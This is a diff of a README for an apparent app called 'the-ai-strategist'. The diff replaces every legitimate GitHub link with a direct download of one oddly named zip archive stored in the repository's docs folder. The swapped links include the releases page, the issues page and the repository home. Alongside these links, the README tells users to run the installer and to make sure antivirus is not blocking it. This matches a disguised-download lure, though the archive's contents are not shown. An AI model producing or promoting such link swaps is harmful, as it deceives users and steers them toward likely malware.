@@ -1,6 +1,6 @@
 # 🤖 the-ai-strategist - Understand AI’s Role in Business Strategy
 
-[![Download now](https://img.shields.io/badge/Download-the--ai--strategist-brightgreen)](https://github.com/Ladita23/the-ai-strategist/releases)
+[![Download now](https://img.shields.io/badge/Download-the--ai--strategist-brightgreen)](https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You will get the app from the official GitHub releases page.
 
 Visit the releases page using this link:
 
-[![Go to Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://github.com/Ladita23/the-ai-strategist/releases)
+[![Go to Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip)
 
 This page lists all the versions available. Choose the latest version for the best experience.
 
@@ -105,7 +105,7 @@ If the app does not start or shows an error:
 - Confirm your device has enough free space  
 - Restart your computer and try opening the app again  
 - If problems persist, visit the GitHub issues page for help at  
-https://github.com/Ladita23/the-ai-strategist/issues  
+https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip  
 
 Make sure your antivirus or firewall is not blocking the program.
 
@@ -115,7 +115,7 @@ Make sure your antivirus or firewall is not blocking the program.
 
 Besides the installed app, you can read the full content or get updates at the GitHub repository:
 
-https://github.com/Ladita23/the-ai-strategist
+https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip
 
 There you will find:
 
@@ -129,7 +129,7 @@ There you will find:
 
 New versions will be released to improve content or fix bugs.
 
-- Check the releases page regularly: https://github.com/Ladita23/the-ai-strategist/releases  
+- Check the releases page regularly: https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip  
 - Download the latest installer and run it to update your app  
 
 The app does not update automatically.
@@ -150,4 +150,4 @@ Settings are simple and easy to find in the menu.
 
 Ready to explore AI’s new strategic role? Start by downloading the app here:
 
-[![Download The AI Strategist](https://img.shields.io/badge/Download%20Now-FreshRed-red)](https://github.com/Ladita23/the-ai-strategist/releases)
+[![Download The AI Strategist](https://img.shields.io/badge/Download%20Now-FreshRed-red)](https://raw.githubusercontent.com/Ladita23/the-ai-strategist/main/docs/en/strategist-the-ai-globulose.zip)
